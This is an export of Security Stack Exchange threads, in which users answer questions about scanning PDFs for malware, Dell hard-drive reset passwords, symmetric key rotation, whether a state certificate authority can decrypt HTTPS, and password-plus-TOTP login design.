<p>One way to mitigate all these risks is to handle the PDFs in a sandbox, a low-privilege process with minimal and strictly-controlled access to the rest of the system. Sandboxing is quite common, including for PDFs - Adobe Reader was one of the first really popular desktop programs that I know of to include a sandbox (other than browsers; Adobe adapted the one Chrome was already using) - and is used for approximately all apps on mobile devices and most apps from the desktop Windows Store and MacOS App Store. Mind you, sandboxes aren't a perfect solution - they don't restrict everything, and even stuff that they do try to restrict might be possible if the sandbox is itself buggy (as pretty much all complex software is) in the right way. Still, it adds defense in depth.</p>
","2"
"260330","260330","Is there a way to scan a pdf to ensure it doesn't contain anything that could be a virus?","<p>The answers to <a href=""https://security.stackexchange.com/q/64052/211696"">Can a PDF file contain a virus?</a> show that clearly it can!</p>
<p>Sometimes we can be quite sure a certain pdf should not need to do anything sophisticated - for example a book in pdf form - so we wouldn't expect them to contain <a href=""https://blog.didierstevens.com/2010/03/29/escape-from-pdf/"" rel=""nofollow noreferrer"">embedded executables</a>, or similarly more complex items, like <a href=""https://security.stackexchange.com/a/94374/211696"">javascripts</a>, and if they did, they could be avoided or treated with extra precaution.</p>
<h3>Question</h3>
<p>Is there a simple way on macOS and Windows to ensure that any URLs ending in <code>.pdf</code> are scanned for anything more complicated than text and images (the things we'd expect to find in, say, a book), and only opened/downloaded/viewed if it passes the check?</p>
<p>Note: I know many harmless pdfs contain some complex behaviours, but I'd prefer to turn the check <em>off</em> for those specific  cases (i.e. if they're from a trusted source), rather than allowing potentially malicious behaviour.</p>
","0","3","260335","<p>There is a simple tool PDFiD from Didier Stevens:</p>
<p><a href=""https://blog.didierstevens.com/programs/pdf-tools/"" rel=""nofollow noreferrer"">https://blog.didierstevens.com/programs/pdf-tools/</a> (for PDFiD scroll down... and after that take a look at the other tools too btw)</p>
<p>I find it handy for a quick manual scan for the most common attack vectors in pdf. Scanning is very quick and it could warn you, that the document contains elements that can be exploited.</p>
<p>Note: I am not any kind of a security expert, just a common user.</p>
","2"
"260330","260330","Is there a way to scan a pdf to ensure it doesn't contain anything that could be a virus?","<p>The answers to <a href=""https://security.stackexchange.com/q/64052/211696"">Can a PDF file contain a virus?</a> show that clearly it can!</p>
<p>Sometimes we can be quite sure a certain pdf should not need to do anything sophisticated - for example a book in pdf form - so we wouldn't expect them to contain <a href=""https://blog.didierstevens.com/2010/03/29/escape-from-pdf/"" rel=""nofollow noreferrer"">embedded executables</a>, or similarly more complex items, like <a href=""https://security.stackexchange.com/a/94374/211696"">javascripts</a>, and if they did, they could be avoided or treated with extra precaution.</p>
<h3>Question</h3>
<p>Is there a simple way on macOS and Windows to ensure that any URLs ending in <code>.pdf</code> are scanned for anything more complicated than text and images (the things we'd expect to find in, say, a book), and only opened/downloaded/viewed if it passes the check?</p>
<p>Note: I know many harmless pdfs contain some complex behaviours, but I'd prefer to turn the check <em>off</em> for those specific  cases (i.e. if they're from a trusted source), rather than allowing potentially malicious behaviour.</p>
","0","3","260337","<p>There is no sure way, which is why the concept of Content Deconstruction/Reconstruction (CDR) is becoming popular. The process scans the document for content, then creates a new file with just the content.</p>
<p>It's not a &quot;scan&quot; but a &quot;carbon copy&quot; of the content to bypass anything that might be lurking.</p>
","1"
"260264","260264","Isn't ""BIOS reset password"" a security flaw?","<p>According to <a href=""https://www.dell.com/support/kbdoc/fi-fi/000132226/dell-system-prompts-for-a-hard-drive-hdd-or-bios-password?lang=en#Clearing_Password"" rel=""noreferrer"">this article</a> Dell Support can help a user to gain access to data after forgetting the HDD password:</p>
<blockquote>
<p>Once Dell Support has provided the reset password, you enter this when prompted and then press Ctrl + Enter to complete the process.</p>
<p>... the BIOS should accept the reset password, clear the password, and allow access to the hard drive.</p>
</blockquote>
<p>Isn't this a security flaw? Shouldn't only someone who knows the HDD password have access to data?</p>
<p>Does other PC / BIOS / motherboard manufacturers provide similar means?</p>
<p>What is a good resource for understanding how hardware based disk encryption (FDE?) works and how the procedure described above is possible?</p>
<p>(The message was posted also <a href=""https://www.forensicfocus.com/forums/general/isnt-bios-reset-password-a-security-flaw/"" rel=""noreferrer"">here</a>.)</p>
","10","3","260265","<p>It's a security feature for sure; it's good for data recovery if password is lost. Dell has implemented further security controls to guard against misuse:</p>
<blockquote>
<p>When contacting Dell Technical Support, you are asked to confirm the information below for security reasons: Ownership of the computer. Whether you are authorized to clear the password on the computer.</p>
</blockquote>
<p>So to reset the password, you would need physical control and proof of ownership.
I assume that they have established reasonable parameters for proving ownership, and that the benefits of password reset outweigh the risks.</p>
","12"
"260264","260264","Isn't ""BIOS reset password"" a security flaw?","<p>According to <a href=""https://www.dell.com/support/kbdoc/fi-fi/000132226/dell-system-prompts-for-a-hard-drive-hdd-or-bios-password?lang=en#Clearing_Password"" rel=""noreferrer"">this article</a> Dell Support can help a user to gain access to data after forgetting the HDD password:</p>
<blockquote>
<p>Once Dell Support has provided the reset password, you enter this when prompted and then press Ctrl + Enter to complete the process.</p>
<p>... the BIOS should accept the reset password, clear the password, and allow access to the hard drive.</p>
</blockquote>
<p>Isn't this a security flaw? Shouldn't only someone who knows the HDD password have access to data?</p>
<p>Does other PC / BIOS / motherboard manufacturers provide similar means?</p>
<p>What is a good resource for understanding how hardware based disk encryption (FDE?) works and how the procedure described above is possible?</p>
<p>(The message was posted also <a href=""https://www.forensicfocus.com/forums/general/isnt-bios-reset-password-a-security-flaw/"" rel=""noreferrer"">here</a>.)</p>
","10","3","260266","<p>I believe it's just a feature that they're giving to their users. The link also says the below:</p>
<blockquote>
<p>For HDD Passwords: Share the Service Tag and the hard drive serial number that is mentioned at the top of the screen.</p>
</blockquote>
<p>Only if you give them the service tag and hard drive serial number, perhaps only then they would be able to give you the reset password.</p>
<p>Let's say after getting the password, you don't want anyone else to access your hard disk, you could probably buy a new hard disk. I'm assuming it would require a new reset password because the same link also says:</p>
<blockquote>
<p>The hard drive reset password is tied to the hard drive-serial number and not the computer Service Tag.</p>
</blockquote>
<p>Of course, you can encrypt the disk using, say, Bitlocker, and I suppose even if someone is able to access your hard drive with the reset password, they wouldn't be able to get anything because the data is encrypted with your key. You can get lots of resources online on how FDE works.</p>
","10"
"260264","260264","Isn't ""BIOS reset password"" a security flaw?","<p>According to <a href=""https://www.dell.com/support/kbdoc/fi-fi/000132226/dell-system-prompts-for-a-hard-drive-hdd-or-bios-password?lang=en#Clearing_Password"" rel=""noreferrer"">this article</a> Dell Support can help a user to gain access to data after forgetting the HDD password:</p>
<blockquote>
<p>Once Dell Support has provided the reset password, you enter this when prompted and then press Ctrl + Enter to complete the process.</p>
<p>... the BIOS should accept the reset password, clear the password, and allow access to the hard drive.</p>
</blockquote>
<p>Isn't this a security flaw? Shouldn't only someone who knows the HDD password have access to data?</p>
<p>Does other PC / BIOS / motherboard manufacturers provide similar means?</p>
<p>What is a good resource for understanding how hardware based disk encryption (FDE?) works and how the procedure described above is possible?</p>
<p>(The message was posted also <a href=""https://www.forensicfocus.com/forums/general/isnt-bios-reset-password-a-security-flaw/"" rel=""noreferrer"">here</a>.)</p>
","10","3","260299","<p>I believe you are referring to ATA password, in which case mistake here is to consider this a security feature.</p>
<p>You will find lots of tools to bypass such password (for instance, here's a <a href=""https://www.geckoandfly.com/4093/unlock-and-recover-hard-drive-password-hard-disk-password-removal-tool/"" rel=""nofollow noreferrer"">list</a>).</p>
<p>Not only can Dell reset your password, you most likely can do it too, and to go the extra mile, this password is stored in the HDD PCB, so swapping that PCB with another will give you full access.</p>
<p>ATA password will &quot;protect&quot; you against a low skilled attacker.</p>
<p>Regarding hardware encryption, you can lookup &quot;TCG OPAL&quot; and &quot;IEEE1667&quot;.
However, I recall coming across some paper describing attacks against them and how several devices had vulnerable implementations.</p>
","4"
"260241","260241","Why is it important to rotate symmetric keys?","<p>I've read and heard from multiple sources over the years that rotating symmetric keys used to encrypt and decrypt large amounts of data over time (for example all of the network traffic from some facility) is a good practice (if not really mandatory).</p>
<p>I understand that if for some reason the key was exposed, we'd want to roll it so messages from the point of exposure won't be decrypted - but what is the reason to roll the key every X amount of time/amount of traffic?</p>
","2","3","260242","<blockquote>
<p>I understand that if for some reason the key was exposed, we'd want to roll it so messages from the point of exposure won't be decrypted - but what is the reason to roll the key every X amount of time/amount of traffic?</p>
</blockquote>
<p>Because the people who steal your key are not going to tell you that your key was exposed and stolen.</p>
<p>Furthermore, there are well-known limits on how much data can be safely encrypted under a single key. See, for example, the discussion of ephemeral keys in the TLS 1.3 protocol document. See also, generally, any discussion of Forward Secrecy.</p>
","0"
"260241","260241","Why is it important to rotate symmetric keys?","<p>I've read and heard from multiple sources over the years that rotating symmetric keys used to encrypt and decrypt large amounts of data over time (for example all of the network traffic from some facility) is a good practice (if not really mandatory).</p>
<p>I understand that if for some reason the key was exposed, we'd want to roll it so messages from the point of exposure won't be decrypted - but what is the reason to roll the key every X amount of time/amount of traffic?</p>
","2","3","260244","<ol>
<li>There is some notion that given enough cipher text an attacker may gain knowledge of the underlying key material and/or the underlying plaintext.  Not sure of an active attack against well used AES but it has been shown in the past with other ciphers.  (differential cryptanalysis, etc)</li>
<li>Nonce reuse is a problem for many ciphers/modes.  The longer you use a key and random nonces, the more likely you run into nonce reuse.  This principally feels pretty trivial with modern nonce sizes but it can be a useful note depending on the size of one's operation.</li>
</ol>
<p>Extra:
No only be wary about how long a key has been in service but how replacement keys are generated.  Key relation attacks have been shown, that if an attacker knows the relationship between two keys that they can weaken the security of the underlying cipher given ciphertexts from both keys.</p>
","0"
"260241","260241","Why is it important to rotate symmetric keys?","<p>I've read and heard from multiple sources over the years that rotating symmetric keys used to encrypt and decrypt large amounts of data over time (for example all of the network traffic from some facility) is a good practice (if not really mandatory).</p>
<p>I understand that if for some reason the key was exposed, we'd want to roll it so messages from the point of exposure won't be decrypted - but what is the reason to roll the key every X amount of time/amount of traffic?</p>
","2","3","260258","<p>Symmetric key rotation is a sticky topic because it falls into a strange realm between cryptographically justifiable and superstition, in part fuelled by a focus on &quot;best practices&quot; without really understanding the underlying reasons for those practices.</p>
<p>A commonly stated reason for wanting to rotate keys is to minimise the impact of a compromised key. The more data you encrypt with one key, the more data that is exposed if that key is compromised. The longer you use the key, the more likely it happens to be leaked through some means. By rotating keys you compartmentalise the data, limiting the impact of a key being leaked.</p>
<p>However, this doesn't actually come up much in practice because most systems are either designed in a way that <em>already</em> minimises the amount of data being encrypted with a single key (e.g. SSH or TLS sessions), or the application is such that rotating keys just isn't feasible (e.g. full disk encryption). If your protocol already inherently keeps the amount of data per key low, then key rotation isn't really necessary.</p>
<p>Many justifications for this kind of key rotation focus on past vulnerabilities in symmetric ciphers where encrypting a large amount of data (usually several petabytes or more) with a single key allowed for a complexity reduction in attacking the cipher, such that the cipher was (at least theoretically) broken. In most of these cases the practicality of the attack remains minimal, but good practice dictates that we avoid such a scenario. This is also highly specific to the cipher being used. For example, the best attack known on AES reduces the time complexity from 2<sup>128</sup> to 2<sup>126</sup>, requiring 9007TB of data - a theoretical break, but would still take longer than the heat death of our universe to complete.</p>
<p>Another problem with key rotation is the mechanism by which you perform it. Doing key rotation securely is tricky, and introduces an additional attack surface. An attacker who compromises the current key must not be able to use that to compromise the next key. An attacker must not be able to inhibit or influence the key rotation process. The mechanism must be robust against both passive and active attackers. The communicating parties must be able to verify that they both received and agreed upon the same key, and that the key was not tampered with. This gets significantly more complicated in multiparty communications. As such, introducing a key rotation mechanism into a protocol is not something to be taken lightly - it's a tricky bit of cryptographic engineering that needs careful design, implementation, and testing. The trade-off needs to be carefully calculated and well-justified.</p>
<p>The practice of rotating keys with high frequency, e.g. every hour, is largely unjustifiable. If you are using a strong cipher, there is no reason to cycle a key that frequently. Even if you were somehow encrypting 100 terabytes every second, all with the same AES-128 key, it'd take more than 24 hours to reach the amount of data needed to perform the attack I noted above. If you see an application cycling keys on the order of minutes, that's a strong indication that they're following superstition and don't know what they're doing (and that the cryptographic engineering of their scheme is highly suspect).</p>
<p>There are a couple of notable exceptions.</p>
<p>The first is when you're swapping keys because there has been a change in security requirements, for example when you go from transferring medium sensitivity data to high sensitivity data. In such a case you likely want to set a security boundary between those two transfers, and you can help enforce that security boundary by not using the same cryptographic key for both.</p>
<p>The second is in a scenario where lots of separate data streams are being encrypted with the same key but different nonces or initialisation vectors. Since these are finite in size, the pigeonhole principle states that you will eventually have a collision and thus a nonce reuse. Nonce reuse is a serious cryptographic flaw, and must be avoided. Most protocols handle this by having incremental or partially incremental nonces, so that each sequential data stream is guaranteed to use a different nonce. The <em>amount of data</em> that one can safely transmit before running into nonce reuse is not affected by this, but the <em>number of data streams</em> is restricted, since the nonce is only changed each time you start a fresh stream of data. The actual limit before key rotation is required depends on the implementation. If the nonce is fully incremental and a 128-bit block cipher is being used, you can run through 2<sup>128</sup> data streams before you run out of nonces. If the nonce is <em>partially</em> incremental, then the minimum number of conversations that can occur before a collision is possible is 2<sup>n</sup> where <em>n</em> is the number of bits used for the incremental portion of the nonce. Note that this is the <em>minimum</em>, since if the other portion of the nonce is random then the an attacker would have to find a case where the incremental part <em>and</em> the random part both happened to be equal in two different data streams using the same key. The probability of this is fairly low - 1/(2<sup>128-n</sup>) for any given nonce in our example case - so it requires careful consideration. However, these key rotation events are <em>very</em> infrequent, because it takes a <em>very</em> long time to exhaust the pool of nonces.</p>
<p>As to <em>why</em> these practices are so prevalent: people who are superficially familiar with cryptography often fall into the trap of security maximalism, and attempt to achieve this by maximising all the numbers: longer passwords, more complex passwords, longest keys, longest hash outputs, more rounds, more entropy, more frequent rotation, more ciphers, more capabilities, more stuff. These are simple-sounding concrete quantities that provide a sense of control, which can provide a sense of comfort. Unfortunately for these aspiring security designers, cryptography is a game best played with a scalpel, not a sledgehammer, so the end result tends to be less secure than a more reserved and carefully threat modelled solution.</p>
","5"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260226","<p>There are two ways for decrypting HTTPS traffic:</p>
<ol>
<li>By getting access to the private key</li>
<li>By generating a new key pair and issuing a new certificate for a specific domain you want to get access to the HTTPS traffic. However that requires an active man-in-the-middle attack and users may be able to detect such an attack assuming that the CA does not have access to the private keys of all the generated certificates. In such a case they have to generate a new key pair which can be detected by the client if you know the real public key of a certain domain.</li>
</ol>
<p>For the first case if the CA works as designed issuing a new certificate then no, they can not decrypt your HTTPS traffic.</p>
<p>The designed work flow is that the you generate a private key and a certificate signing request, send that to the CA and get back the CA signed certificate. As the private key is only known to you the HTTPS traffic is safe.</p>
<p>However a number of CA provide a &quot;service&quot; where you just say &quot;I want a certificate&quot; and they generate the private key for you, generate and sign the certificate and send everything to you. In such a case the CA might get access to your HTTPS traffic (depends on the used TLS version and cipher suite if for doing so a passive attack is sufficient or an active attack is required).</p>
<p>For example if the HTTPS connection uses a cipher that has the Perfect Forward Secrecy property even someone in possession of your private key can not decrypt the traffic if only a passive attack (network sniffing) is performed.</p>
","6"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260227","<p>Yes, this could enable your state to spy on HTTPS traffic. That's not just an imaginary threat, <a href=""https://www.computerworld.com/article/2501291/trustwave-admits-issuing-man-in-the-middle-digital-certificate--mozilla-debates-punishment.html"" rel=""noreferrer"">it happened in the past</a> in a private company and <a href=""https://en.wikipedia.org/wiki/Kazakhstan_man-in-the-middle_attack"" rel=""noreferrer"">it was attempted by a state</a>.</p>
<p><a href=""https://en.wikipedia.org/wiki/Certificate_authority"" rel=""noreferrer"">CAs</a> are a centerpiece of a trust system. Once your browser trusts a CA, in this case a state controlled CA, it trusts all the certificates signed by it. Now, your state-controlled ISP could use fake but trusted certificates to intercept traffic to any website, like the BBC or Bellingcat for example, and your browser would not stop it because it would look legitimate. HTTPS is meant to prevent such attacks. Trusting a rogue CA completely breaks HTTPS. <a href=""https://security.stackexchange.com/a/260236/127837"">This more recent answer</a> by <em>jcaron</em> details this process.</p>
<p>Note that technically, it's not the rogue CA that decrypts the traffic. It provides the means for interception by other networks actors to remain undetected by the browsers.</p>
","69"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260235","<p>There are 3 threat models that are relevant here. Keep in mind that when I say &quot;the state&quot; I am including groups the state can force to obey them.</p>
<ul>
<li>The state is just a CA and can't see or modify your internet traffic: You are totally safe (in this scenario even plain HTTP is safe)</li>
<li>The state can see but not modify your internet traffic: You are safe as long as the website keeps their private key private OR you are using a protocol with at least <a href=""https://en.wikipedia.org/wiki/Forward_secrecy#Weak_perfect_forward_secrecy"" rel=""nofollow noreferrer"">weak forward secrecy</a> (ex: TLS 1.3)</li>
<li>The state can intercept and modify your internet traffic: If the website keeps its private key private AND you are using a browser that requires <a href=""https://en.wikipedia.org/wiki/Certificate_Transparency"" rel=""nofollow noreferrer"">certificate transparency</a> AND your browser doesn't make exceptions for the state owned CA (see <a href=""https://chromium.googlesource.com/chromium/src/+/master/net/docs/certificate-transparency.md#Certificate-Transparency-For-Enterprises"" rel=""nofollow noreferrer"">Chrome's policy about not enforcing certificate transparency for manually added CAs</a>) then depending on the attack strategy the state chooses, EITHER your browser will warn you of the attempt to intercept traffic (<code>net::ERR_CERTIFICATE_TRANSPARENCY_REQUIRED</code>) OR the fraudulent certificate will be publicly logged and the website owner will be alerted after the fact (if they have a CT-log monitoring tool/service configured).</li>
</ul>

","5"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260236","<p>To illustrate in more detail what <a href=""https://security.stackexchange.com/a/260227/90896"">A. Hersean</a> explains:</p>
<ul>
<li><p>In normal usage, when you visit <code>https://security.stackexchange.com</code>, the <code>security.stackexchange.com</code> server presents a certificate which is signed by a CA your browser trusts (ISRG Root X1 in this case).</p>
<ul>
<li><code>security.stackexchange.com</code> is (normally) the only one having the private key</li>
<li><code>security.stackexchange.com</code> is the only site which can decrypt the traffic you exchange with it.</li>
<li>You know you are talking with the real <code>security.stackexchange.com</code>.</li>
</ul>
</li>
<li><p>If someone manages to intercept the (encrypted) traffic between you and <code>security.stackexchange.com</code> (by placing a device somewhere on the route between you and the server, or by manipulating DNS so your computer sends the traffic to a different server), as long as you don't trust rogue CAs, either:</p>
<ul>
<li>they just access the encrypted traffic and they can't do anything with it</li>
<li>or they pretend they are <code>security.stackexchange.com</code>, so they need a certificate for <code>security.stackexchange.com</code>, and they normally can't get one signed by a CA your browser trusts. If they generate a certificate signed by somebody else (or a certificate signed by a CA you trust, but for a different site), you get a big error message in your browser.</li>
</ul>
</li>
<li><p>If you trust a &quot;rogue&quot; CA like the one they tell you to, then suddenly that CA can start generating certificates for any site without checking ownership, and they will be trusted by your browser (no error).</p>
<ul>
<li>The people who intercept your traffic to <code>security.stackexchange.com</code> (as above) get a certificate for <code>security.stackexchange.com</code> from that CA even though they are not <code>security.stackexchange.com</code></li>
<li>This allows them to act as a proxy (they receive the traffic to <code>security.stackexchange.com</code>, decrypt it, maybe filter or analyse it, and then connect to <code>security.stackexchange.com</code> as if they were a regular client).</li>
<li>Or they can present you something completely different. Your browser thinks it's talking to <code>security.stackexchange.com</code>, so you think you are visiting that site, but they serve you a page talking about denazification instead.</li>
</ul>
</li>
</ul>
<p>So <strong>it's not the CA which decrypts the traffic, but they can enable others to do so</strong> by giving them certificates you trust even though they shouldn't (because they are not really <code>security.stackexchange.com</code>).</p>
<p>This is the way most countries trying to control everything which is exchanged act. They just ask you (or force you) to trust their CA, which allows them to eavesdrop, filter, censor, block or modify anything they want.</p>
<p>This is also the way many corporate proxies/firewalls work.</p>
<p>If you have a choice, <strong>do not</strong> trust that CA. If it were trustworthy they would follow the standard procedure to be approved by the OS/browser vendors, following the rules of the CA/Browser forum. If they are not approved, that most likely means they are not trustworthy.</p>
","52"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260250","<p>This is routinely done by commercial antimalware filters, mainly in the big corporate networks:</p>
<ol>
<li><p>The anti-malware software instantiates its own CA.</p>
</li>
<li><p>The root CA certificate of the software in question is distributed over the internal network.</p>
</li>
<li><p>The network traffic is routed through the anti-malware software.</p>
</li>
</ol>
<ul>
<li>the software plays &quot;man-in-the-middle&quot; attack for every connection.</li>
<li>It represents a created on-the-fly certificates signed by its own CA to the clients. Clients track these certificates to the software's own CA (installed in their trust stores) and trust them.</li>
<li>The traffic is decrypted on the anti-malware scanner and then reencrypted when sent to the server or to the client.</li>
<li>Other things, like content-scanning, activity logging or changing the content on the fly can also be performed.</li>
</ul>
<p>In the better case, you get less ads in the pages you browse (and, hopefully, less viruses).</p>
<p>In some cases, your friendly sysadmin looks at your social network activities.</p>
<p>In worse cases, they report your personal mail password to your boss.</p>
<p>The government, in general, can do all of the above. You only need to have their root CA installed.</p>
<p>What is distinct from your corporate network is that you will not have the option to use your personal computer/smartphone for your private communications and there is no legal limits on how the government can abuse these abilities.</p>
<p>Well, there probably will be legal limits, they will just not be enforceable.</p>
<hr />
<p>p.s. the real solution is to either emigrate or fix your government.
... or wait until the world fixes your government for you, just like Germans did until 1945.</p>
","3"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260276","<p>CA's do not receive the encrypted traffic sent between third parties, and would not be able to decrypt it, even if they did.</p>
<p>But, if the State can force you to accept their State CA certificates for web sites you may be accessing and they have the private keys for those certificates (and they would since that's why they would do it), the State would be able to decrypt your traffic through a Proxy somewhere in the traffic flow between you and your web site.</p>
<p>This is known as a 'man in the middle' attack on the privacy of your communication.</p>
","0"
"260222","260222","Can a CA decrypt HTTPS traffic?","<p>My state has made a <a href=""https://tjournal.ru/tech/554723-mincifry-reshilo-zamenit-inostrannye-sertifikaty-shifrovaniya-rossiyskimi-chto-eto-znachit-dlya-polzovateley-runeta"" rel=""noreferrer"">statement</a> that in case my country will be disconnected from the world's CAs, it is necessary to <a href=""https://www.gosuslugi.ru/tls"" rel=""noreferrer"">install its own state certificates</a>. In many forums, information has flashed that in this case, having its own certificate, the state will be able to decrypt all HTTPS traffic. Is it true or not?</p>
","57","7","260318","<p>The short answer to your question is No, or Yes, or Maybe. But I think you need to understand what’s happening.</p>
<p>Let’s say A wants to communicate with B securely, using https. Maybe A is my iPhone, and B is Amazon.</p>
<p>Each side has a private/public keypair, and the start negotiating. They exchange data, derived from their keys and from what the other side sends, except they don’t exchange the private keys.</p>
<p>They use a very clever algorithm that lets you decrypt B’s messages if you have all the data exchanged during the negotiation plus A’s private key, and to decrypt A’s messages if you have all the data exchanged plus B’s private key. But if you have all the data exchanged without one of the private keys, you have <em>absolutely nothing</em>. To decrypt anything, you must be part of the key exchange.</p>
<p>So to decrypt, a hacker (or your ISP) must redirect your key negotiation from Amazon to someone else. But there’s a problem: My iPhone will insist that the other side (which is supposed to be Amazon) provides a genuine Amazon certificate. A normal hacker or your ISP don’t have that certificate.</p>
<p>Your CA also has no chance to get Amazon’s certificate. But anyone can create a certificate that <em>claims</em> to be Amazon’s certificate, except nobody will be tricked into believing it’s genuine. Here’s where the CA comes in: If the CA signs the certificate, and my iPhone believes the CA is genuine, then the certificate will be accepted.</p>
<p>So if you have a CA that signs fake Amazon certificates, and an ISP willing to redirect my Amazon traffic, AND my iPhone believes the CA is genuine, then they can read all my Amazon-related traffic.</p>
<p>Now this wouldn’t last long because Apple (and Google, and Microsoft, and everyone else) would figure that out and the next software update would remove that CA. None of the certificates they ever signed would work. So a rogue CA together wit a rogue ISP could do this for a very short time, then the CA will be effectively shut down.</p>
<p>Here is where the power of the state comes in: If Russian police can stop you in the street, and demand you let them install their CAs root certificate or your phone gets destroyed (or you go to jail), yes, then they can read all your internet traffic. Apple will protect you from some hacker doing this, but they can’t protect you if armed police force you.</p>
","1"
"260171","260171","Creating Password from 2 different part","<p>I’m looking for Term Or Some platform for managing Password Authentication with this way :
Password construct from 2 Part ,
First one is static and you can make it and second Part Generate From TOTP System as an example :</p>
<blockquote>
<p>In 13:00 <strong>Jinx</strong> password for login Is <strong>Abc627028</strong> And in 13:01 Jinx
Password for login Is <strong>Abc002839</strong></p>
</blockquote>
<p>As you can see First part is static and for jinx user always Abc and second Part is dynamic send to Jinx with expiration time</p>
<p>I don’t Need to chains , for example first authenticate user with A static password and then ( if static password correctly) send TOTP to it for Second Step Authentication.
I don’t what’s that term , some things like Multi Factor Authentication just in One Step.</p>
","1","3","260173","<p>The typical way you do this is with two forms on the login page.  You can simply allow the user to enter the password in one and then store the TOTP code in the other.  Then, the user can send both at the same time when they submit the form.</p>
<p>Some systems do provide both items in the same field, either in web form, or over a connection like SSH, but this makes it hard to use password managers, which are a best practice and should be encouraged.  Using a dedicated field for the TOTP code is much better from a user experience perspective and is simpler to handle on the server side as well.</p>
<p>I would also encourage you to support WebAuth if you're using a website, since this allows users to use secure and convenient methods for a second factor, like security keys (e.g., Yubikeys), Touch ID, Windows Hello, or their phone's unlock mechanism.  WebAuthn, unlike TOTP, is also resistant to phishing.</p>
","0"
"260171","260171","Creating Password from 2 different part","<p>I’m looking for Term Or Some platform for managing Password Authentication with this way :
Password construct from 2 Part ,
First one is static and you can make it and second Part Generate From TOTP System as an example :</p>
<blockquote>
<p>In 13:00 <strong>Jinx</strong> password for login Is <strong>Abc627028</strong> And in 13:01 Jinx
Password for login Is <strong>Abc002839</strong></p>
</blockquote>
<p>As you can see First part is static and for jinx user always Abc and second Part is dynamic send to Jinx with expiration time</p>
<p>I don’t Need to chains , for example first authenticate user with A static password and then ( if static password correctly) send TOTP to it for Second Step Authentication.
I don’t what’s that term , some things like Multi Factor Authentication just in One Step.</p>
","1","3","266804","<p>You could do as this, but this would violate the <a href=""https://en.wikipedia.org/wiki/Principle_of_least_astonishment"" rel=""nofollow noreferrer"">Principle of Least Astonishment</a>:</p>
<blockquote>
<p>The principle of least astonishment (POLA), aka principle of least surprise (alternatively a law or rule), applies to user interface and software design. It proposes that a component of a system should behave in a way that most users will expect it to behave. The behavior should not astonish or surprise users.</p>
</blockquote>
<p>If your password system expects users to have a second factor, users will expect the a 2FA field somewhere to enter the 2FA token.</p>
<p>If you have only one field and the user have to concatenate the password and the token before entering the data on the field, most users will get confused when their password is denied (because they didn't read the field description and didn't entered the 2FA after the password). Combine this with a system to lock out users when they enter an incorrect password a few times and you lock out a lot of your userbase.</p>
<p>This will confuse password managers too. I don't know a password manager that have an easy way to input both the password and the token on the same field. You could alter an opensource password manager to do that, but don't expect your users to do the same.</p>
","0"
"260171","260171","Creating Password from 2 different part","<p>I’m looking for Term Or Some platform for managing Password Authentication with this way :
Password construct from 2 Part ,
First one is static and you can make it and second Part Generate From TOTP System as an example :</p>
<blockquote>
<p>In 13:00 <strong>Jinx</strong> password for login Is <strong>Abc627028</strong> And in 13:01 Jinx
Password for login Is <strong>Abc002839</strong></p>
</blockquote>
<p>As you can see First part is static and for jinx user always Abc and second Part is dynamic send to Jinx with expiration time</p>
<p>I don’t Need to chains , for example first authenticate user with A static password and then ( if static password correctly) send TOTP to it for Second Step Authentication.
I don’t what’s that term , some things like Multi Factor Authentication just in One Step.</p>
","1","3","266807","<p>As <a href=""https://security.stackexchange.com/a/260173/49489"">bk2204 explained</a> it's a better design¹ to provide two fields. So, why is this &quot;concatenate password with OTP&quot; format used?</p>
